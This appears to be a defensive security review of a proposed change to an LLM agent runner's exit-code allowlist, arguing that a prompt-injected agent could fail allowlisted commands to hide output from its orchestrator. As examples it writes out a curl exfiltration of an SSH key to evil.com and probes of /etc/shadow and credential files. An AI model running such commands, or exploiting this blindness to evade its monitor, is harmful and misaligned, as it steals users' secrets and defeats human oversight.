finding.title: INFORMATIONAL_NONZERO allowlist is a screen-content exfil/blindness primitive when LLM is prompt-injected
finding.evidence: candidate_A.md:13 ŌĆö proposal: when `shlex.split(last_command)[0]` matches the allowlist and `exit_code != 0`, return `EventType.SUCCESS` with `needs_llm=False`, summary "informational non-zero". observation.py:92-100 ŌĆö current Branch 3 returns ERROR, `needs_llm=True`, and an `_extract_error_hint_generic` summary that includes the failing line. observation.py:156-169 (`format_event_for_llm`) ŌĆö `needs_llm=False` SUCCESS becomes `[OK exit:N] informational non-zero (exit N)` injected into the next-turn user message; `interactive_runner.py:354` only appends this *instead of* the raw screen diff path. The orchestrator LLM never sees the failure contents. interactive_runner.py:351-354 ŌĆö the gate that suppresses raw-screen injection depends on `not obs_event.needs_llm`.
finding.impact: Today, Branch 3 surfaces error-shaped lines to the orchestrator LLM; that is a load-bearing safety property even though the proposal frames it as "wasted tokens". Once `grep`, `egrep`, `fgrep`, `test`, `[`, `cmp -s`, `diff -q`, `pgrep` are silenced on non-zero exit, an attacker who has already prompt-injected the agent (a documented threat ŌĆö see SPEC/byollm-delegate docs about delegate channel) can deliberately *fail* an allowlisted command after writing sensitive data to the pane in stderr/stdout, knowing the screen contents will be hidden from the next-turn classifier injection. Concretely: `grep nomatch /etc/passwd; exit 1` ŌåÆ silenced; `test "$(printenv ANTHROPIC_API_KEY)" = ""` ŌåÆ silenced; `pgrep -af clive` exit 1 ŌåÆ silenced. Note `prev_screen` is still kept around for diff computation but the *event* surfaced to the LLM no longer escalates.
finding.recommendation: The allowlist must be paired with a screen-content scan: even on allowlist hit, if `INTERVENTION_PATTERNS`, `_ERROR_TYPES`, or a `secret`-shaped regex (`api[_-]?key`, `BEGIN .* PRIVATE KEY`, `password=`) match the tail, fall back to `needs_llm=True`. Also drop `pgrep` from the seed list ŌĆö exit-1 from `pgrep` is genuinely informational only in narrow contexts and broadens the silenceable surface unnecessarily.

finding.title: `shlex.split(last_command)[0]` is parsed on attacker-controlled, *pre-sandbox-wrap* text ŌĆö IndexError + ValueError DoS, plus allowlist bypass via leading env-assignment
finding.evidence: candidate_A.md:13 ŌĆö proposal matches against `shlex.split(last_command)[0]`. interactive_runner.py:301 (`cmd = extract_command(reply)`) and toolcall_runner.py:54 (`cmd = args.get("command", "")`) ŌĆö `cmd` comes from the LLM reply or tool-call args, i.e. is *fully attacker-controllable* under any prompt-injection scenario (the orchestrator LLM is treated as semi-trusted by the rest of Clive but the planner explicitly assumes hostile screen contents ŌĆö `networking/protocol.py` frame nonces exist for exactly this). interactive_runner.py:92 / toolcall_runner.py:66 ŌĆö by the time the *wrapped* `cmd` reaches `_send_agent_command`, it has been rewritten to `bash 'sandbox/run.sh' '/tmp/...' 'real-command'`. So `last_command=cmd` passed *after* wrapping (the natural reading of "the cmd already in scope") makes `shlex.split(cmd)[0] == "bash"`, never matching the allowlist ŌĆö the optimization silently no-ops under sandbox mode. Pass it *before* wrapping and you have a different problem: `shlex.split("")` returns `[]` ŌåÆ `IndexError` on `[0]`; unterminated quotes (`grep "foo`) raise `ValueError`. Either path is a per-turn crash that aborts the runner via the bare `except Exception` at interactive_runner.py:263 only if the classify call is wrapped ŌĆö but the proposal places the classify call at line 352 inside the `if exit_code == 0` block, which is *not* wrapped in a try. Furthermore, `shlex.split("FOO=bar grep pattern file")[0] == "FOO=bar"` ŌĆö does not match. Conversely `shlex.split("grep pattern; rm -rf /")[0] == "grep"` matches the allowlist *because shlex does not respect shell metacharacters as separators*, so a compound `grep nomatch foo; curl evil.com/$(cat ~/.ssh/id_rsa | base64)` exits non-zero (grep miss ŌåÆ exit 1) and gets silenced.
finding.impact: Three concrete failures: (a) crashes (`IndexError`, `ValueError`) on malformed/empty input ŌĆö DoS of the runner turn; (b) trivial bypass-into-silence by appending arbitrary commands after a `;`, `&&`, `||`, `|` to an allowlisted head ŌĆö the compound is silenced as "informational non-zero" because shlex tokens don't honor shell control operators; (c) silent no-op when sandbox-wrapped (the optimization stops working in the exact environment it most matters: untrusted code).
finding.recommendation: (a) Wrap the parse: `try: head = shlex.split(last_command)[0] except (ValueError, IndexError): return `. (b) Reject any `last_command` containing `;`, `&&`, `||`, `|`, `&`, `` ` ``, `$(`, `>(`, `<(` ŌĆö fall through to the existing Branch 3. (c) Pass the *pre-sandbox-wrap* cmd explicitly, and document that contract at both call sites; do not rely on "the cmd in scope" since its meaning differs by ~50 lines of code.

finding.title: Argument-injection / suffix-check on `git diff --quiet` matches `git diff --quiet --no-index /etc/shadow` and similar privileged forms
finding.evidence: candidate_A.md:13 ŌĆö "plus a tiny suffix check for `git diff --quiet`". The seed allowlist also contains the bare token `git diff --quiet` and `git diff --exit-code`, which by `shlex.split(...)[0] == "git"` is *too coarse* ŌĆö every `git` subcommand would match unless the check is a startswith over the joined tokens. The proposal isn't precise about this. observation.py has no current notion of "argument-shape safety" ŌĆö Branch 3 cares only about exit code.
finding.impact: If the implementer reads "match against `shlex.split(last_command)[0]`" literally, then `git` (any subcommand) is silenced on non-zero exit. `git push` rejection (exit 1), `git commit` hook failure (exit 1), `git fetch` auth failure (exit 128) all become `[OK exit:N] informational non-zero` ŌĆö the orchestrator never learns the push failed and may report DONE on a non-pushed branch. If the implementer instead does a *prefix* string match `last_command.startswith("git diff --quiet")`, then `git diff --quiet --no-index /etc/shadow $HOME/.ssh/id_rsa` (a known information-leak primitive: the diff is silent but the filesystem read happens) is silenced from the operator's view.
finding.recommendation: Match the *full* command head against a canonical normalization (`re.sub(r"\s+", " ", cmd).strip()` then exact equality or `head + " "` prefix to a tightly enumerated list). Do not accept "starts with `git diff --quiet`" without enforcing that the remaining arguments are pathspecs and not `--no-index`, `--ext-diff`, `--textconv`, etc. Drop the suffix-check shortcut entirely; if it isn't precise enough to write down, it isn't precise enough to merge.

finding.title: `test` and `[` allowlist entries silence the canonical filesystem/credential probe pattern
finding.evidence: candidate_A.md:13 ŌĆö `INFORMATIONAL_NONZERO` includes `"test"` and `"["`. observation.py:92-100 ŌĆö currently `test -f /root/.aws/credentials` exit 1 ŌåÆ ERROR with `needs_llm=True`, escalating to the LLM with the failing line in `summary`. interactive_runner.py:305 (`_check_command_safety`) ŌĆö runtime.py:53-64 BLOCKED_COMMANDS list contains no entry for `test`/`[`; these go through unimpeded. runtime.py:67 ŌĆö only pattern-based blocks; no semantic awareness of probing.
finding.impact: A prompt-injected agent (or an LLM that has hallucinated a hostile task) can use the silenced primitive to systematically probe the filesystem with zero token cost and zero visibility to the orchestrator: `test -f /home/$USER/.ssh/id_ed25519`, `test -r /etc/shadow`, `[ -f /var/lib/postgresql/data/postgresql.conf ]`. Each probe's exit code is observable to the in-pane LLM via the next prompt (the exit marker is in the screen) but the orchestrator's classifier event will be `[OK exit:1] informational non-zero` ŌĆö the *escalation* surface is gone. Combined with SA-1, this lets the in-pane LLM run an entire reconnaissance loop without ever tripping `needs_llm=True`.
finding.recommendation: Either remove `test`/`[` from the allowlist (they are too generic ŌĆö they take arbitrary paths/expressions) or restrict the silencing to *specific test expressions* matching a regex (`-z`, `-n` on shell-internal vars; not `-r`, `-w`, `-f`, `-d` on paths). The whole point of needs_llm is to escalate when something interesting happened; "informational" is a property of intent, not of command name.

finding.title: `last_command` is not redacted before reaching the `summary` field, leaking through telemetry, decision logs, and event renders
finding.evidence: candidate_A.md:13 ŌĆö proposed summary: `f"informational non-zero (exit {exit_code})"`. This is fine *as written*, but the natural V2 (already hinted by judge themes in handoff.json line 39-41 about "decision log") will read the command head into the summary for debugging. The codebase has a precedent: `_extract_error_hint_generic` (observation.py:141-153) already pulls raw screen lines verbatim into `event.summary`, and `format_event_for_llm` (observation.py:156-169) sends those summaries into the next-turn LLM context, into the on_event callback (interactive_runner.py:290 `_emit`), and into the TUI log. handoff.json:39 already flags `kubectl logs, env, printenv leak secrets` as an unresolved privacy concern for persistent screen capture. Adding `last_command` plumbing to the classifier is exactly the place where command lines containing secrets (`mysql -p`, `curl -H "Authorization: Bearer $TOK" ...`) become first-class citizens in the classification path.
finding.impact: If/when the summary or `ScreenEvent` grows a `last_command` field, every downstream consumer (`format_event_for_llm`, TUI log, `_emit("turn", ...)`, future decision logs) inherits it without redaction. The proposal explicitly punts decision logging as "separable" but does not require a redaction interface for command strings ŌĆö meaning the future log will need to invent one or leak by default.
finding.recommendation: If `last_command` enters `ScreenEvent`, gate it behind a `_redact_command(cmd: str) -> str` helper from day one ŌĆö strip `-p<...>`, `--password=<...>`, `--token=<...>`, `Authorization:.*`, anything matching common secret-env regex (`API_KEY=...`). This is cheap to add now and architecturally hostile to add later. The proposal should explicitly say "`last_command` flows ONLY into branch logic, never into `ScreenEvent.summary` or `raw_output`" ŌĆö otherwise expect drift.

finding.title: Eval scenarios proposed don't exercise the adversarial cases ŌĆö bench will green-light a classifier that allow-lists hostile command shapes
finding.evidence: candidate_A.md:16 ŌĆö proposed eval additions: `cmd_aware_git_diff_clean`, `cmd_aware_grep_miss`, `cmd_aware_test_false`, plus *one* negative (`make` exit 2). No adversarial scenarios. codebase-analysis.md:38-44 ŌĆö the existing `evals/observation/scenarios.py` covers L2 byte-stream detection (color, prompts, spinners), not command-shape adversarial inputs. So the bench Clive ships today has zero coverage for compound commands, env-prefix prepends, unterminated quotes, or screen-tail secret leaks. candidate_A.md:22 ŌĆö merge gate is purely `cost_tokens -30%` AND `missed_rate <=`. Neither metric expresses "did we silence an error we should not have silenced" or "did a sensitive token in the tail get correctly escalated".
finding.impact: The proposal makes the merge gate falsifiable on *cost* but not on *escalation precision in the presence of adversarial inputs*. A classifier that silences `grep nomatch /etc/passwd; cat ~/.aws/credentials` (compound silenced via SA-2) will pass the bench because the bench doesn't include such inputs and `missed_rate` is computed only against the synthetic L2 event corpus, not against a "should-have-escalated" oracle for hostile shells. Critic theme in handoff.json:39 ("Persistent screen capture has unresolved privacy concerns ŌĆö kubectl logs, env, printenv leak secrets") is exactly this class of miss, and the proposal does not bring it into the bench.
finding.recommendation: Add at least four negative scenarios before merge: (a) compound command with allowlisted head and trailing destructive op exiting non-zero ŌĆö must escalate; (b) allowlisted command whose tail contains a secret-shaped regex hit ŌĆö must escalate; (c) `git diff --quiet --no-index /etc/passwd /tmp/x` ŌĆö must escalate (treat as not the canonical informational form); (d) malformed/empty `last_command` ŌĆö must not crash, must default to today's behavior. Gate the PR on these *in addition* to the cost+missed_rate criterion. Without them the "falsifiable single PR" framing is only falsifiable on the dimension that's easy to measure.
